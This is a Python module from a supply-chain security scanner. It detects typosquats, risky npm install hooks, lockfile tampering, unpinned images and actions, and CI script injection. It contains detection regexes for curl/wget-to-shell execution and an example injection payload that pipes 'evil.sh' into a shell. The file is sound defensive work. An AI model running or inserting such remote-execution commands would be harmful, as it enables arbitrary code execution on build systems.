"""Suspicious supply-chain signals, change detection, and the final risk summary.

Every detector is a static rule over the files and the discovered components. A
rule only fires on something it can point at, and records that as ``Evidence``
(file + line or lockfile entry), so each finding can be checked by hand.

Rules
-----
typosquatting           name one edit away from a popular package (or same name, different separators)
install-script          npm package that runs code at install time (lockfile `hasInstallScript`)
unsafe-install-script   the project's own npm install hooks download or eval code
non-registry-source     lockfile entry fetched from git / a URL / another index instead of the registry
insecure-source         lockfile entry fetched over plain http
missing-integrity       npm lockfile entry without an integrity hash
lockfile-mismatch       manifest and lockfile disagree (lockfile edited by hand or not regenerated)
unexpected-dependency   lockfile contains a direct dependency the manifest never asked for / nothing requires
untrusted-image         container image that is mutable (:latest, no digest) or from an unrecognised source
remote-script           `curl ... | sh` style execution of downloaded code (Dockerfile RUN, CI `run:`)
unverified-download     Dockerfile ADD of a remote URL without --checksum
unpinned-action         GitHub Action referenced by a movable tag/branch instead of a commit SHA
untrusted-input-in-script  attacker-controlled `${{ github.event.* }}` text expanded inside a CI shell script
dangerous-trigger       pull_request_target workflow that checks out the pull request's code
version-downgrade       a package went DOWN in version since the previous analysis
new-dependency          a direct dependency appeared since the previous analysis
"""
from __future__ import annotations

import json
import re
import tomllib
from collections import defaultdict
from typing import Any, Iterable, Optional

from packaging.requirements import InvalidRequirement, Requirement
from packaging.specifiers import SpecifierSet
from packaging.utils import canonicalize_name

from backend.analyzers.base import build_purl, dirname
from backend.analyzers.docker_analyzer import _logical_instructions
from backend.analyzers.workflow_analyzer import (
    LineFinder, SHA_RE, iter_run_steps, iter_uses, load_workflow, triggers,
)
from backend.models import (
    ChangeReport, Component, ComponentChange, DiscoveryResult, Evidence, Finding, RiskSummary, ROOT_ID,
    SEVERITY_ORDER,
)
from backend.services.graph_service import PathFinder
from backend.services.popular_packages import lookalike_of
from backend.services.vulnerability_service import _newer, initial_risk

MAX_PER_RULE_PER_FILE = 25

_REMOTE_EXEC_RE = re.compile(
    r"(?:curl|wget)\b[^\n|;&]*\|\s*(?:sudo\s+)?(?:env\s+\S+\s+)*(?:ba|z|da|k)?sh\b"
    r"|(?:ba|z)?sh\s+(?:-c\s+)?[\"']?\$\((?:curl|wget)\b"
    r"|(?:ba|z)?sh\s+<\(\s*(?:curl|wget)\b"
    r"|(?:curl|wget)\b[^\n|;&]*\|\s*(?:sudo\s+)?(?:python[23]?|node|perl|ruby)\b"
    r"|iex\s*\(\s*(?:new-object\s+net\.webclient|iwr|invoke-webrequest)", re.IGNORECASE)
_DANGEROUS_HOOK_RE = re.compile(r"curl|wget|\bbase64\b|\beval\b|node\s+-e|https?://|\|\s*(?:ba)?sh\b", re.IGNORECASE)
_UNTRUSTED_EXPR_RE = re.compile(
    r"\$\{\{\s*github\.(?:head_ref|event\.(?:"
    r"issue\.(?:title|body)|pull_request\.(?:title|body|head\.ref|head\.label|head\.repo\.default_branch)"
    r"|comment\.body|review\.body|review_comment\.body|discussion\.(?:title|body)"
    r"|head_commit\.(?:message|author\.(?:email|name))|commits\[[^\]]*\]\.(?:message|author\.(?:email|name))"
    r"|workflow_run\.head_branch))\s*\}\}")
_TRUSTED_REGISTRIES = {"docker.io", "index.docker.io", "registry-1.docker.io", "ghcr.io", "gcr.io", "mcr.microsoft.com",
                       "public.ecr.aws", "quay.io", "registry.k8s.io", "cgr.dev", "registry.access.redhat.com",
                       "registry.gitlab.com", "nvcr.io"}
_BRANCH_REFS = {"main", "master", "develop", "dev", "trunk", "latest", "head", "nightly", "edge"}
_NPM_REGISTRIES = ("https://registry.npmjs.org/", "https://registry.yarnpkg.com/")


class _Collector:
    def __init__(self, result: DiscoveryResult) -> None:
        self.findings: list[Finding] = []
        self._count: dict[tuple[str, str], int] = defaultdict(int)
        self.overflow: dict[tuple[str, str], int] = defaultdict(int)
        self.by_key = {(c.ecosystem, c.name.lower(), c.version): c for c in result.components}
        self.by_id = {c.id: c for c in result.components}

    def component(self, ecosystem: str, name: str, version: Optional[str]) -> Optional[Component]:
        return self.by_key.get((ecosystem, name.lower(), version))

    def add(self, *, rule: str, title: str, severity: str, source_file: str, evidence: list[Evidence],
            description: str = "", component: Optional[Component] = None, name: Optional[str] = None,
            version: Optional[str] = None, ecosystem: Optional[str] = None, key: str = "") -> None:
        k = (rule, source_file)
        if self._count[k] >= MAX_PER_RULE_PER_FILE:
            self.overflow[k] += 1
            return
        self._count[k] += 1
        if component:
            risk, why = initial_risk(severity, component, None)
            why = why.replace("; no fixed version published", "")
        else:
            risk, why = severity, "project configuration (not tied to a single package)"
        self.findings.append(Finding(
            id=f"{rule}:{source_file}:{key or (component.id if component else title)}", category="suspicious",
            rule=rule, title=title, description=description, severity=severity, risk=risk, risk_rationale=why,
            component_id=component.id if component else None,
            component_name=component.name if component else name,
            component_version=component.version if component else version,
            ecosystem=component.ecosystem if component else ecosystem,
            dependency_type=component.dependency_type if component else None,
            evidence=evidence,
        ))


# ------------------------------------------------------------- detectors
def _typosquatting(col: _Collector, result: DiscoveryResult) -> None:
    for c in result.components:
        if c.ecosystem not in {"pypi", "npm"}:
            continue
        name = canonicalize_name(c.name) if c.ecosystem == "pypi" else c.name.lower()
        hit = lookalike_of(name, c.ecosystem)
        if not hit:
            continue
        popular, how = hit
        col.add(rule="typosquatting", severity="high" if c.dependency_type == "direct" else "medium",
                title=f"Possible typosquat: '{c.name}' looks like the popular package '{popular}'",
                description=(f"'{c.name}' is {how} from '{popular}'. Attackers publish look-alike names hoping for a "
                             "typo in a manifest. Confirm this package is the one you intended."),
                source_file=(c.source_files or ["?"])[0], component=c,
                evidence=[Evidence(source=f, detail=f"declares {c.name} {c.version or ''}".strip()) for f in c.source_files]
                + [Evidence(source="popular-package list", detail=f"'{popular}' is a widely used {c.ecosystem} package; "
                                                                  f"'{c.name}' is {how}")])


def _npm_name(key: str, entry: dict[str, Any]) -> str:
    return entry.get("name") or key.rsplit("node_modules/", 1)[-1]


def _npm_lock(col: _Collector, path: str, text: str, package_json: Optional[tuple[str, str]]) -> None:
    try:
        lock = json.loads(text)
    except ValueError:
        return
    packages = lock.get("packages")
    if not isinstance(packages, dict):
        return  # lockfile v1: no per-package source/integrity layout we can check reliably
    lf = LineFinder(text)
    for key, entry in packages.items():
        if not key or not isinstance(entry, dict) or entry.get("link") or entry.get("inBundle"):
            continue
        name, version = _npm_name(key, entry), entry.get("version")
        comp = col.component("npm", name, version)
        line = lf.find(f'"{key}"')
        where = Evidence(source=path, detail=f'"{key}": version {version}', line=line)
        resolved = entry.get("resolved")
        if entry.get("hasInstallScript"):
            col.add(rule="install-script", severity="low", source_file=path, component=comp, name=name, version=version,
                    ecosystem="npm", key=key,
                    title=f"'{name}' runs a script when it is installed",
                    description="npm runs this package's preinstall/install/postinstall script with your user's "
                                "permissions during `npm install`. Common for native modules, but it is also how most "
                                "malicious npm packages act. Check it is expected, or install with --ignore-scripts.",
                    evidence=[Evidence(source=path, detail=f'"{key}" has "hasInstallScript": true', line=line)])
        if isinstance(resolved, str):
            if resolved.startswith("http://"):
                col.add(rule="insecure-source", severity="high", source_file=path, component=comp, name=name,
                        version=version, ecosystem="npm", key=key,
                        title=f"'{name}' is downloaded over plain HTTP",
                        description="An HTTP download can be swapped in transit. The lockfile should only point at https URLs.",
                        evidence=[where, Evidence(source=path, detail=f"resolved: {resolved}", line=line)])
            elif not resolved.startswith(_NPM_REGISTRIES):
                col.add(rule="non-registry-source", severity="medium", source_file=path, component=comp, name=name,
                        version=version, ecosystem="npm", key=key,
                        title=f"'{name}' does not come from the npm registry",
                        description="This package is fetched from a git repository, tarball URL or another registry. "
                                    "Such sources skip the registry's immutability guarantees; confirm the source is trusted.",
                        evidence=[where, Evidence(source=path, detail=f"resolved: {resolved}", line=line)])
            elif not entry.get("integrity"):
                col.add(rule="missing-integrity", severity="medium", source_file=path, component=comp, name=name,
                        version=version, ecosystem="npm", key=key,
                        title=f"'{name}' has no integrity hash in the lockfile",
                        description="Without an integrity hash npm cannot detect a tampered download. Regenerate the lockfile.",
                        evidence=[where, Evidence(source=path, detail="no \"integrity\" field", line=line)])
        if entry.get("extraneous"):
            col.add(rule="unexpected-dependency", severity="medium", source_file=path, component=comp, name=name,
                    version=version, ecosystem="npm", key=key,
                    title=f"'{name}' is in the lockfile but nothing requires it",
                    description="npm marks this package 'extraneous': no declared dependency pulls it in.",
                    evidence=[Evidence(source=path, detail=f'"{key}" has "extraneous": true', line=line)])

    if package_json:
        _npm_manifest_vs_lock(col, path, packages, *package_json)


def _npm_manifest_vs_lock(col: _Collector, lock_path: str, packages: dict, pj_path: str, pj_text: str) -> None:
    try:
        pj = json.loads(pj_text)
    except ValueError:
        return
    root = packages.get("") or {}
    pj_lf = LineFinder(pj_text)
    for section in ("dependencies", "devDependencies", "optionalDependencies"):
        want = pj.get(section) or {}
        have = root.get(section) or {}
        if not isinstance(want, dict) or not isinstance(have, dict):
            continue
        for name, spec in want.items():
            installed = packages.get(f"node_modules/{name}")
            if name not in have or (installed is None and section != "optionalDependencies"):
                col.add(rule="lockfile-mismatch", severity="medium", source_file=lock_path, name=name, ecosystem="npm",
                        key=f"{section}:{name}:missing",
                        title=f"'{name}' is in package.json but missing from the lockfile",
                        description="The lockfile no longer matches package.json: it was edited by hand or not regenerated "
                                    "after a change. Builds may install something nobody reviewed.",
                        evidence=[Evidence(source=pj_path, detail=f'{section}: "{name}": "{spec}"', line=pj_lf.find(f'"{name}"')),
                                  Evidence(source=lock_path, detail=f'no "{name}" under the root package\'s {section}'
                                           + ("" if installed else f' and no "node_modules/{name}" entry'))])
            elif have[name] != spec:
                col.add(rule="lockfile-mismatch", severity="medium", source_file=lock_path, name=name, ecosystem="npm",
                        key=f"{section}:{name}:spec",
                        title=f"Lockfile was generated for a different '{name}' requirement",
                        description="package.json and the lockfile disagree on this dependency's version range, so the "
                                    "lockfile was edited or is stale.",
                        evidence=[Evidence(source=pj_path, detail=f'{section}: "{name}": "{spec}"', line=pj_lf.find(f'"{name}"')),
                                  Evidence(source=lock_path, detail=f'root package {section}: "{name}": "{have[name]}"')])
        for name in set(have) - set(want):
            entry = packages.get(f"node_modules/{name}") or {}
            comp = col.component("npm", name, entry.get("version"))
            col.add(rule="unexpected-dependency", severity="medium", source_file=lock_path, component=comp, name=name,
                    version=entry.get("version"), ecosystem="npm", key=f"{section}:{name}:extra",
                    title=f"Lockfile declares '{name}' but package.json does not",
                    description="The lockfile lists a direct dependency the manifest never asked for. This is a classic "
                                "sign of a tampered or out-of-date lockfile.",
                    evidence=[Evidence(source=lock_path, detail=f'root package {section}: "{name}": "{have[name]}"'),
                              Evidence(source=pj_path, detail=f"no '{name}' in {section}")])


def _req_key(raw: str) -> Optional[tuple[str, str]]:
    try:
        r = Requirement(raw)
    except InvalidRequirement:
        return None
    return canonicalize_name(r.name), str(SpecifierSet(str(r.specifier)))


def _uv_lock(col: _Collector, path: str, text: str, pyproject: Optional[tuple[str, str]]) -> None:
    try:
        lock = tomllib.loads(text)
    except tomllib.TOMLDecodeError:
        return
    lf = LineFinder(text)
    project_name = None
    if pyproject:
        try:
            project_name = canonicalize_name(tomllib.loads(pyproject[1]).get("project", {}).get("name", "") or "")
        except tomllib.TOMLDecodeError:
            pyproject = None
    for pkg in lock.get("package") or []:
        name, version, source = pkg.get("name", ""), pkg.get("version"), pkg.get("source") or {}
        if not isinstance(source, dict) or canonicalize_name(name) == project_name:
            continue
        comp = col.component("pypi", name, version)
        line = lf.find(f'name = "{name}"')
        kind = next(iter(source), None)
        value = str(source.get(kind, "")) if kind else ""
        if kind == "registry" and value.rstrip("/") in {"https://pypi.org/simple", "https://pypi.python.org/simple"}:
            continue
        if kind in {"editable", "virtual", "directory", "path"}:
            continue  # local workspace members, not downloads
        if kind is None:
            continue
        insecure = value.startswith("http://")
        col.add(rule="insecure-source" if insecure else "non-registry-source",
                severity="high" if insecure else "medium", source_file=path, component=comp, name=name,
                version=version, ecosystem="pypi", key=name,
                title=f"'{name}' is not installed from PyPI" + (" (plain HTTP)" if insecure else ""),
                description=f"uv.lock pins this package to a {kind} source instead of pypi.org. Private indexes and git "
                            "sources are sometimes intended, but they are also how dependency-confusion and hijacked "
                            "sources get in. Confirm the source.",
                evidence=[Evidence(source=path, detail=f"{name} {version}: source = {{ {kind} = \"{value}\" }}", line=line)])

    if not pyproject:
        return
    _uv_manifest_vs_lock(col, path, lock, project_name, *pyproject)


def _uv_manifest_vs_lock(col: _Collector, lock_path: str, lock: dict, project: Optional[str], pp_path: str, pp_text: str) -> None:
    if not project:
        return
    try:
        pp = tomllib.loads(pp_text)
    except tomllib.TOMLDecodeError:
        return
    entry = next((p for p in lock.get("package") or [] if canonicalize_name(p.get("name", "")) == project), None)
    meta = (entry or {}).get("metadata")
    if not isinstance(meta, dict):
        return
    declared: dict[str, str] = {}
    for raw in pp.get("project", {}).get("dependencies") or []:
        k = _req_key(raw)
        if k:
            declared[k[0]] = k[1]
    for group in (pp.get("project", {}).get("optional-dependencies") or {}).values():
        for raw in group:
            k = _req_key(raw)
            if k:
                declared.setdefault(k[0], k[1])
    for group in (pp.get("dependency-groups") or {}).values():
        for raw in group:
            if isinstance(raw, str):
                k = _req_key(raw)
                if k:
                    declared.setdefault(k[0], k[1])
    locked: dict[str, str] = {}
    reqs = list(meta.get("requires-dist") or [])
    for group in (meta.get("requires-dev") or {}).values():
        reqs += list(group or [])
    for r in reqs:
        if isinstance(r, dict) and r.get("name"):
            locked.setdefault(canonicalize_name(r["name"]), str(SpecifierSet(r.get("specifier", "") or "")))
    pp_lf = LineFinder(pp_text)
    for name, spec in declared.items():
        if name not in locked:
            col.add(rule="lockfile-mismatch", severity="medium", source_file=lock_path, name=name, ecosystem="pypi",
                    key=f"{name}:missing", title=f"'{name}' is in pyproject.toml but not in uv.lock",
                    description="uv.lock was not regenerated after pyproject.toml changed (or was edited by hand).",
                    evidence=[Evidence(source=pp_path, detail=f"declares {name}{spec}", line=pp_lf.find(name)),
                              Evidence(source=lock_path, detail=f"project metadata has no requirement on {name}")])
        elif spec != locked[name]:
            col.add(rule="lockfile-mismatch", severity="medium", source_file=lock_path, name=name, ecosystem="pypi",
                    key=f"{name}:spec", title=f"uv.lock was resolved for a different '{name}' requirement",
                    description="pyproject.toml and uv.lock disagree on this requirement, so the lockfile is stale or edited.",
                    evidence=[Evidence(source=pp_path, detail=f"declares {name}{spec or ' (any version)'}", line=pp_lf.find(name)),
                              Evidence(source=lock_path, detail=f"locked against {name}{locked[name] or ' (any version)'}")])
    for name in set(locked) - set(declared):
        col.add(rule="unexpected-dependency", severity="medium", source_file=lock_path, name=name, ecosystem="pypi",
                key=f"{name}:extra", title=f"uv.lock requires '{name}' but pyproject.toml does not",
                description="The lockfile's project metadata lists a dependency the manifest never declared.",
                evidence=[Evidence(source=lock_path, detail=f"project metadata requires {name}{locked[name]}"),
                          Evidence(source=pp_path, detail=f"no '{name}' requirement")])


def _image_findings(col: _Collector, path: str, line: Optional[int], image: str, tag: Optional[str],
                    digest: Optional[str], context: str) -> None:
    comp = col.component("docker", image, digest or tag)
    ref = image + (f":{tag}" if tag else "") + (f"@{digest}" if digest else "")
    ev = [Evidence(source=path, detail=f"{context}: {ref}", line=line)]
    first = image.split("/")[0]
    registry = first if ("." in first or ":" in first or first == "localhost") and "/" in image else "docker.io"
    repo = image[len(registry) + 1:] if registry != "docker.io" and image.startswith(registry) else image
    if registry not in _TRUSTED_REGISTRIES:
        col.add(rule="untrusted-image", severity="medium", source_file=path, component=comp, name=image, version=tag,
                ecosystem="docker", key=f"{ref}:registry", title=f"Image '{image}' comes from an unrecognised registry",
                description=f"'{registry}' is not a well-known public registry. Make sure it is your own or a trusted one.",
                evidence=ev)
    elif registry == "docker.io" and "/" in repo and not repo.startswith("library/"):
        col.add(rule="untrusted-image", severity="medium", source_file=path, component=comp, name=image, version=tag,
                ecosystem="docker", key=f"{ref}:publisher",
                title=f"Image '{image}' is published by a Docker Hub user, not an official image",
                description=f"Anyone can publish under '{repo.split('/')[0]}/'. Prefer official or verified-publisher "
                            "images, and pin them by digest.", evidence=ev)
    if not digest:
        mutable = tag in (None, "latest")
        col.add(rule="untrusted-image", severity="medium" if mutable else "low", source_file=path, component=comp,
                name=image, version=tag, ecosystem="docker", key=f"{ref}:pin",
                title=(f"Image '{image}' uses the mutable ':latest' tag" if mutable
                       else f"Image '{image}:{tag}' is not pinned by digest"),
                description=("The image behind ':latest' changes whenever it is republished, so builds are not "
                             "reproducible and a compromised push is picked up silently. Pin a version and a digest."
                             if mutable else
                             "A tag can be moved to a different image. Pin with @sha256:... to build exactly what was reviewed."),
                evidence=ev)


def _dockerfile(col: _Collector, path: str, text: str, result: DiscoveryResult) -> None:
    meta = next((d for d in result.docker if d.source_file == path), None)
    if meta:
        for img in meta.images:
            if img.notes and img.notes[0].startswith(("References an earlier build stage", "Empty base image")):
                continue
            if not img.tag and not img.digest and "$" in img.image:
                continue  # unresolved ARG: already reported as a limitation
            _image_findings(col, path, img.line, img.image, img.tag, img.digest, f"FROM (stage {img.stage_index})")
    for line, ins in _logical_instructions(text):
        kw, _, rest = ins.partition(" ")
        if kw.upper() == "RUN" and _REMOTE_EXEC_RE.search(rest):
            col.add(rule="remote-script", severity="high", source_file=path, key=f"run:{line}",
                    title="Dockerfile pipes a downloaded script straight into a shell",
                    description="Whatever the URL serves at build time is executed, with no version or checksum. "
                                "Download to a file, verify its checksum, then run it.",
                    evidence=[Evidence(source=path, detail=ins[:300], line=line)])
        if kw.upper() == "ADD" and re.search(r"\bhttps?://", rest) and "--checksum" not in rest:
            col.add(rule="unverified-download", severity="medium", source_file=path, key=f"add:{line}",
                    title="Dockerfile downloads a remote file without verifying it",
                    description="ADD with a URL fetches whatever is served at build time. Use ADD --checksum=sha256:... "
                                "or download and verify explicitly.",
                    evidence=[Evidence(source=path, detail=ins[:300], line=line)])


def _workflow(col: _Collector, path: str, text: str) -> None:
    try:
        doc = load_workflow(text, path)
    except ValueError:
        return
    for u in iter_uses(doc, text):
        ev = [Evidence(source=path, detail=f"job '{u.job}'" + (f" step {u.step + 1}" if u.step is not None else "")
                       + f": uses: {u.raw}", line=u.line)]
        if u.kind == "docker":
            from backend.analyzers.docker_analyzer import split_image
            image, tag, digest = split_image(u.raw[len("docker://"):] if u.raw.startswith("docker://") else u.raw)
            _image_findings(col, path, u.line, image, tag, digest, f"job '{u.job}' container")
            continue
        if u.kind == "local" or (u.ref and SHA_RE.match(u.ref)):
            continue
        owner = u.name.split("/")[0].lower()
        first_party = owner in {"actions", "github"}
        branch = (u.ref or "").lower() in _BRANCH_REFS or not u.ref
        sev = ("medium" if branch else "low") if first_party else ("high" if branch else "medium")
        comp = col.component("github-actions", u.name, u.ref)
        col.add(rule="unpinned-action", severity=sev, source_file=path, component=comp, name=u.name, version=u.ref,
                ecosystem="github-actions", key=f"{u.raw}:{u.line}",
                title=f"Action '{u.name}' is pinned to the {'branch' if branch else 'tag'} '{u.ref or '(none)'}', not a commit",
                description=("Whoever controls this repository can change what runs in your CI, with access to its "
                             "secrets and tokens, by moving the "
                             + ("branch" if branch else "tag") + ". Pin to a full commit SHA (keep the tag as a comment)."
                             + (" This is a GitHub-owned action, so the risk is lower." if first_party else "")),
                evidence=ev)

    trig = triggers(doc)
    for job, idx, script, line in iter_run_steps(doc, text):
        where = f"job '{job}' step {idx + 1}"
        if _REMOTE_EXEC_RE.search(script):
            col.add(rule="remote-script", severity="high", source_file=path, key=f"{job}:{idx}:remote",
                    title="CI step pipes a downloaded script straight into a shell",
                    description="The script runs with the workflow's secrets and token. Download, verify a checksum, then run.",
                    evidence=[Evidence(source=path, detail=f"{where}: {script.strip()[:300]}", line=line)])
        m = _UNTRUSTED_EXPR_RE.search(script)
        if m:
            col.add(rule="untrusted-input-in-script", severity="high", source_file=path, key=f"{job}:{idx}:inject",
                    title=f"CI script expands attacker-controlled text: {m.group(0)}",
                    description="Titles, branch names and comment bodies are written by outsiders. Expanded directly in "
                                "`run:`, text like `\"; curl evil.sh | sh #` becomes shell code (script injection). "
                                "Pass it through an env: variable instead.",
                    evidence=[Evidence(source=path, detail=f"{where}: {m.group(0)}", line=line)])
    if "pull_request_target" in trig:
        lf = LineFinder(text)
        for job_id, job in (doc.get("jobs") or {}).items():
            steps = job.get("steps") if isinstance(job, dict) else None
            for step in steps if isinstance(steps, list) else []:
                with_ = step.get("with") if isinstance(step, dict) else None
                ref = with_.get("ref", "") if isinstance(with_, dict) else ""
                if isinstance(ref, str) and re.search(r"pull_request\.head|head_ref|refs/pull/", ref):
                    col.add(rule="dangerous-trigger", severity="high", source_file=path, key=f"{job_id}:prt",
                            title="pull_request_target workflow checks out the pull request's code",
                            description="pull_request_target runs with write permissions and secrets. Checking out and "
                                        "building the PR's own code lets any outside contributor run code with them "
                                        "('pwn request').",
                            evidence=[Evidence(source=path, detail="on: pull_request_target", line=lf.find("pull_request_target")),
                                      Evidence(source=path, detail=f"job '{job_id}' checks out ref: {ref}", line=lf.find(str(ref)))])


def _inferred_orphans(col: _Collector, result: DiscoveryResult) -> None:
    resolving = {f.path for f in result.files if f.provides_transitive}
    for r in result.relationships:
        if not (r.inferred and r.source == ROOT_ID):
            continue
        c = col.by_id.get(r.target)
        if not c or c.dependency_type == "unknown" or not (set(c.source_files) & resolving):
            continue
        col.add(rule="unexpected-dependency", severity="medium", source_file=(c.source_files or ["?"])[0], component=c,
                key=f"orphan:{c.id}", title=f"'{c.name}' is in the lockfile but nothing requires it",
                description="No declared dependency pulls this package in. It may be a leftover, or it may have been "
                            "added to the lockfile directly.",
                evidence=[Evidence(source=f, detail=f"lists {c.name} {c.version or ''}".strip()) for f in c.source_files])


def detect_suspicious(result: DiscoveryResult, texts: dict[str, str], formats: dict[str, str]) -> list[Finding]:
    col = _Collector(result)
    by_dir: dict[tuple[str, str], tuple[str, str]] = {}
    for path, fmt in formats.items():
        by_dir[(dirname(path), fmt)] = (path, texts[path])
    for path, fmt in sorted(formats.items()):
        text = texts[path]
        if fmt == "package-lock.json":
            _npm_lock(col, path, text, by_dir.get((dirname(path), "package.json")))
        elif fmt == "package.json":
            try:
                scripts = (json.loads(text).get("scripts") or {})
            except (ValueError, AttributeError):
                scripts = {}
            lf = LineFinder(text)
            for hook in ("preinstall", "install", "postinstall", "prepare", "prepublish"):
                cmd = scripts.get(hook) if isinstance(scripts, dict) else None
                if isinstance(cmd, str) and _DANGEROUS_HOOK_RE.search(cmd):
                    col.add(rule="unsafe-install-script", severity="high", source_file=path, key=hook,
                            title=f"package.json '{hook}' hook downloads or evaluates code",
                            description="This command runs automatically on `npm install` for everyone who installs the "
                                        "project. Fetching or eval-ing code there is a common malware technique.",
                            evidence=[Evidence(source=path, detail=f'"{hook}": "{cmd[:200]}"', line=lf.find(f'"{hook}"'))])
        elif fmt == "uv.lock":
            _uv_lock(col, path, text, by_dir.get((dirname(path), "pyproject.toml")))
        elif fmt == "poetry.lock":
            try:
                lock = tomllib.loads(text)
            except tomllib.TOMLDecodeError:
                continue
            lf = LineFinder(text)
            for pkg in lock.get("package") or []:
                src = pkg.get("source") or {}
                if isinstance(src, dict) and src.get("type") in {"git", "url", "legacy"}:
                    url = str(src.get("url", ""))
                    comp = col.component("pypi", pkg.get("name", ""), pkg.get("version"))
                    col.add(rule="insecure-source" if url.startswith("http://") else "non-registry-source",
                            severity="high" if url.startswith("http://") else "medium", source_file=path, component=comp,
                            name=pkg.get("name"), version=pkg.get("version"), ecosystem="pypi", key=pkg.get("name", ""),
                            title=f"'{pkg.get('name')}' is not installed from PyPI",
                            description=f"poetry.lock fetches it from a {src.get('type')} source. Confirm the source is trusted.",
                            evidence=[Evidence(source=path, detail=f"source type={src.get('type')} url={url}",
                                               line=lf.find(f'name = "{pkg.get("name")}"'))])
        elif fmt == "Dockerfile":
            _dockerfile(col, path, text, result)
        elif fmt == "github-workflow":
            _workflow(col, path, text)
    _typosquatting(col, result)
    _inferred_orphans(col, result)
    for (rule, path), n in col.overflow.items():
        result.warnings.append(f"{path}: {n} more '{rule}' finding(s) were not listed individually.")
    return col.findings


# ------------------------------------------------------------ change diff
def _versions(result: DiscoveryResult) -> dict[tuple[str, str], tuple[set[str], str]]:
    out: dict[tuple[str, str], tuple[set[str], str]] = {}
    for c in result.components:
        key = (c.ecosystem, canonicalize_name(c.name) if c.ecosystem == "pypi" else c.name.lower())
        vs, dtype = out.get(key, (set(), c.dependency_type))
        vs.add(c.version or "unresolved")
        out[key] = (vs, "direct" if "direct" in {dtype, c.dependency_type} else dtype)
    return out


def compare(previous: DiscoveryResult, current: DiscoveryResult) -> tuple[ChangeReport, list[Finding]]:
    """What changed since the previous analysis of the same source, and which changes look suspicious."""
    old, new = _versions(previous), _versions(current)
    by_key = {}
    for c in current.components:
        by_key.setdefault((c.ecosystem, canonicalize_name(c.name) if c.ecosystem == "pypi" else c.name.lower()), c)
    report = ChangeReport(previous_analysis_id=previous.analysis_id, previous_created_at=previous.created_at)
    findings: list[Finding] = []
    prev_ev = Evidence(source="previous analysis",
                       detail=f"{previous.analysis_id} from {previous.created_at:%Y-%m-%d %H:%M} UTC")
    for key in sorted(set(old) | set(new)):
        eco, name = key
        if key not in old:
            vs, dtype = new[key]
            report.changes.append(ComponentChange(name=name, ecosystem=eco, change="added", new_versions=sorted(vs),
                                                  dependency_type=dtype))
            comp = by_key.get(key)
            if dtype == "direct" and comp:
                risk, why = initial_risk("low", comp, None)
                findings.append(Finding(
                    id=f"new-dependency:{comp.id}", category="suspicious", rule="new-dependency",
                    title=f"New direct dependency '{comp.name}' since the last analysis", severity="low", risk=risk,
                    risk_rationale=why.replace("; no fixed version published", ""),
                    description="A dependency was added. Make sure the change was intended and reviewed.",
                    component_id=comp.id, component_name=comp.name, component_version=comp.version,
                    ecosystem=eco, dependency_type=dtype,
                    evidence=[prev_ev, *[Evidence(source=f, detail=f"now declares {comp.name} {comp.version or ''}".strip())
                                         for f in comp.source_files]]))
            continue
        if key not in new:
            vs, dtype = old[key]
            report.changes.append(ComponentChange(name=name, ecosystem=eco, change="removed", old_versions=sorted(vs),
                                                  dependency_type=dtype))
            continue
        (ov, _), (nv, dtype) = old[key], new[key]
        if ov == nv:
            continue
        kind = "changed"
        if len(ov) == 1 and len(nv) == 1 and "unresolved" not in ov | nv:
            a, b = next(iter(ov)), next(iter(nv))
            kind = "upgraded" if _newer(b, a) else ("downgraded" if _newer(a, b) else "changed")
        report.changes.append(ComponentChange(name=name, ecosystem=eco, change=kind, old_versions=sorted(ov),
                                              new_versions=sorted(nv), dependency_type=dtype))
        comp = by_key.get(key)
        if kind == "downgraded" and comp:
            risk, why = initial_risk("medium", comp, None)
            findings.append(Finding(
                id=f"version-downgrade:{comp.id}", category="suspicious", rule="version-downgrade",
                title=f"'{comp.name}' went DOWN from {next(iter(ov))} to {next(iter(nv))}", severity="medium", risk=risk,
                risk_rationale=why.replace("; no fixed version published", ""),
                description="Downgrades are unusual: they can re-introduce fixed vulnerabilities, and an unexplained "
                            "version change in a lockfile can mean it was tampered with.",
                component_id=comp.id, component_name=comp.name, component_version=comp.version, ecosystem=eco,
                dependency_type=dtype,
                evidence=[prev_ev, Evidence(source=", ".join(comp.source_files) or "current analysis",
                                            detail=f"was {', '.join(sorted(ov))}, now {', '.join(sorted(nv))}")]))
    for c in report.changes:
        setattr(report, c.change, getattr(report, c.change) + 1)
    return report, findings


# ------------------------------------------------------------- finalising
def finalize(result: DiscoveryResult, findings: Iterable[Finding], scan_status: Optional[str] = None,
             checked: Optional[int] = None, not_checked: Optional[int] = None) -> None:
    """Attach dependency paths, de-duplicate, sort by risk and compute the summary (in place)."""
    unique: dict[str, Finding] = {}
    for f in findings:
        unique.setdefault(f.id, f)
    labels = {ROOT_ID: result.project_name}
    labels.update({c.id: f"{c.name} {c.version}" if c.version else c.name for c in result.components})
    pf = PathFinder((r.source, r.target) for r in result.relationships)
    for f in unique.values():
        if f.component_id and not f.paths:
            f.paths = [[labels.get(n, n) for n in p] for p in pf.paths(f.component_id, limit=3)]
    ordered = sorted(unique.values(), key=lambda f: (-SEVERITY_ORDER[f.risk], -SEVERITY_ORDER[f.severity],
                                                     f.category != "vulnerability", f.title))
    result.findings = ordered
    risk = RiskSummary(
        vulnerability_scan=scan_status if scan_status is not None else result.risk.vulnerability_scan,
        components_checked=checked if checked is not None else result.risk.components_checked,
        components_not_checked=not_checked if not_checked is not None else result.risk.components_not_checked,
    )
    risk.total_findings = len(ordered)
    for f in ordered:
        risk.by_risk[f.risk] += 1
    vulns = [f for f in ordered if f.category == "vulnerability"]
    risk.vulnerabilities = len(vulns)
    risk.vulnerable_components = len({f.component_id for f in vulns})
    risk.suspicious_signals = len(ordered) - len(vulns)
    result.risk = risk
